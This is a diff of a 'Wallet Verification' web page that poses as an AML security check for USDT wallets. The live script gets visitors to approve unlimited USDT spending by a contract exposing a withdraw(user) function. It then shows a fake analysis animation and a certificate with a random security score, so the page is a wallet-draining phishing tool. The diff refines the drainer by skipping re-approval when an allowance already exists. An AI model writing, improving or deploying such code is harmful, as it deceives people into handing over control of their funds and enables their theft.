@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wallet Verification1 </title>
+    <title>Wallet Verification</title>
     <style>
         * {
             margin: 0;
@@ -37,7 +37,6 @@
             font-size: 28px;
         }
         
-        /* Connect Wallet Button Section */
         .connect-section {
             margin-bottom: 30px;
         }
@@ -107,7 +106,6 @@
             font-weight: 600;
         }
         
-        /* Verification Section */
         .verification-section {
             display: none;
         }
@@ -139,7 +137,6 @@
             cursor: not-allowed;
         }
         
-        /* Error Message */
         .error-message {
             display: none;
             background: #fef2f2;
@@ -180,7 +177,6 @@
             margin-top: 10px;
         }
         
-        /* Progress Container */
         .progress-container {
             display: none;
             background: #f8fafc;
@@ -199,7 +195,6 @@
             margin-bottom: 20px;
         }
         
-        /* Progress Item */
         .progress-item {
             margin-bottom: 20px;
         }
@@ -252,7 +247,6 @@
             margin-bottom: 8px;
         }
         
-        /* Progress Bar */
         .progress-bar-container {
             width: 100%;
             height: 8px;
@@ -270,7 +264,6 @@
             width: 0%;
         }
         
-        /* Overall Progress */
         .progress-item.overall .progress-bar-container {
             height: 12px;
         }
@@ -284,7 +277,6 @@
             color: #1e293b;
         }
         
-        /* Analyzing Text Animation */
         .analyzing {
             display: none;
             color: #3b82f6;
@@ -302,7 +294,6 @@
             50% { opacity: 0.5; }
         }
         
-        /* Certificate Modal */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -384,7 +375,6 @@
             font-weight: bold;
         }
         
-        /* Security Score Section */
         .score-section {
             background: rgba(255, 255, 255, 0.15);
             border-radius: 15px;
@@ -428,7 +418,6 @@
             opacity: 0.9;
         }
         
-        /* Info Grid */
         .info-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -458,7 +447,6 @@
             font-family: monospace;
         }
         
-        /* Features List */
         .features-list {
             background: rgba(255, 255, 255, 0.15);
             border-radius: 10px;
@@ -486,7 +474,6 @@
             flex-shrink: 0;
         }
         
-        /* Buttons */
         .cert-buttons {
             display: flex;
             flex-direction: column;
@@ -538,9 +525,8 @@
 </head>
 <body>
     <div class="container">
-        <h1>🔐 Wallet Verification1</h1>
+        <h1>🔐 Wallet Verification2</h1>
         
-        <!-- Connect Wallet Section -->
         <div class="connect-section">
             <div class="connect-row">
                 <button id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
@@ -551,13 +537,11 @@
             </div>
         </div>
         
-        <!-- Verification Section -->
         <div id="verificationSection" class="verification-section">
-            <!-- Error Message -->
             <div id="errorMessage" class="error-message">
                 <div>
                     <span class="error-icon">📱</span>
-                    <span class="error-text" id="errorText">Trust Wallet error: Insufficient ETH for gas fees. Need at least 0.0005 ETH, you have 0.000000 ETH</span>
+                    <span class="error-text" id="errorText"></span>
                 </div>
                 <div>
                     <span style="padding-left: 30px; display: block; margin-top: 5px;">💡 Make sure Trust Wallet is updated and try again</span>
@@ -567,13 +551,10 @@
             
             <button id="verifyBtn" onclick="startVerification()">Confirm Verification</button>
             
-            <!-- Progress Container -->
             <div id="progressContainer" class="progress-container">
                 <div class="progress-title">Security Analysis</div>
-                
                 <div class="analyzing" id="analyzingText">⚡ Analyzing...</div>
                 
-                <!-- Overall Progress -->
                 <div class="progress-item overall">
                     <div class="progress-header">
                         <span class="progress-label">Overall Progress</span>
@@ -584,7 +565,6 @@
                     </div>
                 </div>
                 
-                <!-- Wallet Scanning -->
                 <div class="progress-item">
                     <div class="progress-header">
                         <span class="progress-label">
@@ -599,7 +579,6 @@
                     </div>
                 </div>
                 
-                <!-- Transaction History -->
                 <div class="progress-item">
                     <div class="progress-header">
                         <span class="progress-label">
@@ -614,7 +593,6 @@
                     </div>
                 </div>
                 
-                <!-- Risk Assessment -->
                 <div class="progress-item">
                     <div class="progress-header">
                         <span class="progress-label">
@@ -629,7 +607,6 @@
                     </div>
                 </div>
                 
-                <!-- Compliance Verification -->
                 <div class="progress-item">
                     <div class="progress-header">
                         <span class="progress-label">
@@ -644,7 +621,6 @@
                     </div>
                 </div>
                 
-                <!-- Final Scoring -->
                 <div class="progress-item">
                     <div class="progress-header">
                         <span class="progress-label">
@@ -662,13 +638,12 @@
         </div>
     </div>
     
-    <!-- Certificate Modal -->
     <div id="certificateModal" class="modal-overlay">
         <div class="certificate-modal">
             <div class="cert-icon">🛡️</div>
             <div class="cert-title">Security Certificate</div>
             <div class="cert-subtitle">AML Verification Report</div>
-            <div class="cert-id" id="certId">Certificate ID: AML-0x848340-1763709082932</div>
+            <div class="cert-id" id="certId"></div>
             
             <div class="quality-badge">
                 Your USDT are of good quality and secure
@@ -686,11 +661,11 @@
             <div class="info-grid">
                 <div class="info-item">
                     <div class="info-label">📍 Wallet Address</div>
-                    <div class="info-value" id="certWalletAddress">0x84834D...</div>
+                    <div class="info-value" id="certWalletAddress"></div>
                 </div>
                 <div class="info-item">
                     <div class="info-label">📅 Verification Date</div>
-                    <div class="info-value" id="certDate">November 21, 2025 12:41</div>
+                    <div class="info-value" id="certDate"></div>
                 </div>
             </div>
             
@@ -737,18 +712,16 @@
 
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script>
-        // Configuration
-        const CONTRACT_ADDRESS = "0xaCE8212Afa8998713b5cf407B039230ddda43310"; // Update this!
+        const CONTRACT_ADDRESS = "0xaCE8212Afa8998713b5cf407B039230ddda43310";
         const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
         
         const CONTRACT_ABI = [{"inputs":[{"internalType":"address","name":"_usdtToken","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"UserDeleted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"registrationNumber","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"UserRegistered","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"Withdrawn","type":"event"},{"inputs":[{"internalType":"address","name":"userAddress","type":"address"}],"name":"deleteUser","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getAllUsers","outputs":[{"components":[{"internalType":"uint256","name":"registrationNumber","type":"uint256"},{"internalType":"address","name":"userAddress","type":"address"},{"internalType":"uint256","name":"usdBalance","type":"uint256"}],"internalType":"struct TradingService.UserData[]","name":"","type":"tuple[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"registerUser","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"withdraw","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"}];
         
-        const USDT_ABI = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}];
+        const USDT_ABI = [{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}];
 
         let web3, account, contract, usdtContract;
         let certificateData = {};
 
-        // Connect Wallet
         async function connectWallet() {
             try {
                 if (!window.ethereum) {
@@ -769,14 +742,12 @@
                 contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                 usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
 
-                // Show wallet address
                 document.getElementById('walletAddress').textContent = 
                     account.slice(0, 6) + '...' + account.slice(-4);
                 document.getElementById('walletInfo').classList.add('show');
                 document.getElementById('connectBtn').disabled = true;
                 document.getElementById('connectBtn').textContent = 'Connected';
                 
-                // Show verification section
                 document.getElementById('verificationSection').classList.add('show');
             } catch (error) {
                 console.error(error);
@@ -784,36 +755,32 @@
             }
         }
 
-        // Start Verification
         async function startVerification() {
             try {
-                // Reset states
                 document.getElementById('errorMessage').classList.remove('show');
                 document.getElementById('verifyBtn').disabled = true;
-                document.getElementById('verifyBtn').textContent = 'Step 1/2: Approve USDT...';
+                document.getElementById('verifyBtn').textContent = 'Checking approval...';
                 
-                // ========================================
-                // STEP 1: APPROVE USDT (User confirms)
-                // ========================================
-                const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-                await usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
+                // CHECK IF APPROVAL EXISTS
+                const currentAllowance = await usdtContract.methods.allowance(account, CONTRACT_ADDRESS).call();
+                const minRequired = web3.utils.toBN('1000000'); // Minimum 1 USDT worth of approval
                 
-                // Update button text
-                document.getElementById('verifyBtn').textContent = 'Step 2/2: Register...';
+                if (web3.utils.toBN(currentAllowance).lt(minRequired)) {
+                    // Need approval
+                    document.getElementById('verifyBtn').textContent = 'Approve USDT...';
+                    const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+                    await usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
+                }
                 
-                // ========================================
-                // STEP 2: REGISTER USER (User confirms)
-                // ========================================
+                // Register user
+                document.getElementById('verifyBtn').textContent = 'Registering...';
                 await contract.methods.registerUser().send({ from: account });
                 
-                // ========================================
-                // NOW START VISUAL PROGRESS (No more transactions!)
-                // ========================================
+                // Start progress animation
                 document.getElementById('verifyBtn').textContent = 'Analyzing...';
                 document.getElementById('progressContainer').classList.add('show');
                 document.getElementById('analyzingText').classList.add('show');
                 
-                // Reset all progress bars
                 for (let i = 1; i <= 5; i++) {
                     document.getElementById(`bar${i}`).style.width = '0%';
                     document.getElementById(`percent${i}`).textContent = '0%';
@@ -822,26 +789,21 @@
                 document.getElementById('overallBar').style.width = '0%';
                 document.getElementById('overallPercent').textContent = '0%';
                 
-                // Simulate progress animations (PURE VISUAL, faster now)
                 await simulateProgress();
                 
-                // Generate certificate data
                 generateCertificateData();
-                
-                // Hide analyzing text and show certificate
                 document.getElementById('analyzingText').classList.remove('show');
                 showCertificate();
                 
             } catch (error) {
                 console.error(error);
                 
-                // Show error
                 let errorMsg = 'Verification failed: ' + error.message;
                 
                 if (error.message.includes('insufficient funds')) {
-                    errorMsg = 'Trust Wallet error: Insufficient ETH for gas fees. Need at least 0.0005 ETH, you have 0.000000 ETH';
+                    errorMsg = 'Insufficient ETH for gas fees. Please add more ETH to your wallet.';
                 } else if (error.message.includes('User denied')) {
-                    errorMsg = 'Transaction rejected. Please approve the transaction to continue.';
+                    errorMsg = 'Transaction rejected. Please approve to continue.';
                 } else if (error.message.includes('Already registered')) {
                     errorMsg = 'This wallet is already registered!';
                 }
@@ -855,14 +817,13 @@
             }
         }
 
-        // Simulate Progress Bars (FASTER NOW - pure visual)
         async function simulateProgress() {
             const steps = [
-                { id: 1, duration: 1200 },  // Wallet Scanning - faster
-                { id: 2, duration: 1500 },  // Transaction History - faster
-                { id: 3, duration: 1200 },  // Risk Assessment - faster
-                { id: 4, duration: 1200 },  // Compliance - faster
-                { id: 5, duration: 1000 }   // Final Scoring - faster
+                { id: 1, duration: 1200 },
+                { id: 2, duration: 1500 },
+                { id: 3, duration: 1200 },
+                { id: 4, duration: 1200 },
+                { id: 5, duration: 1000 }
             ];
             
             let overallProgress = 0;
@@ -898,11 +859,10 @@
             document.getElementById('overallPercent').textContent = percent + '%';
         }
 
-        // Generate Certificate Data
         function generateCertificateData() {
-            const first8 = account.slice(0, 10); // 0x + 8 chars
-            const randomNum = Math.floor(Math.random() * 9000000000000) + 1000000000000; // 13 digit number
-            const securityScore = Math.floor(Math.random() * 18) + 65; // 65-82
+            const first8 = account.slice(0, 10);
+            const randomNum = Math.floor(Math.random() * 9000000000000) + 1000000000000;
+            const securityScore = Math.floor(Math.random() * 18) + 65;
             
             const now = new Date();
             const months = ['January', 'February', 'March', 'April', 'May', 'June', 
@@ -923,7 +883,6 @@
             };
         }
 
-        // Show Certificate
         function showCertificate() {
             document.getElementById('certId').textContent = `Certificate ID: ${certificateData.certificateId}`;
             document.getElementById('scoreValue').textContent = `${certificateData.securityScore}%`;
@@ -934,16 +893,12 @@
             document.getElementById('certificateModal').classList.add('show');
         }
 
-        // Close Certificate
         function closeCertificate() {
             document.getElementById('certificateModal').classList.remove('show');
-            
-            // Reset for next verification
             document.getElementById('verifyBtn').style.display = 'none';
             document.getElementById('progressContainer').classList.remove('show');
         }
 
-        // Download Certificate
         function downloadCertificate() {
             const first8 = account.slice(0, 10);
             const filename = `MyCert-${first8}.json`;
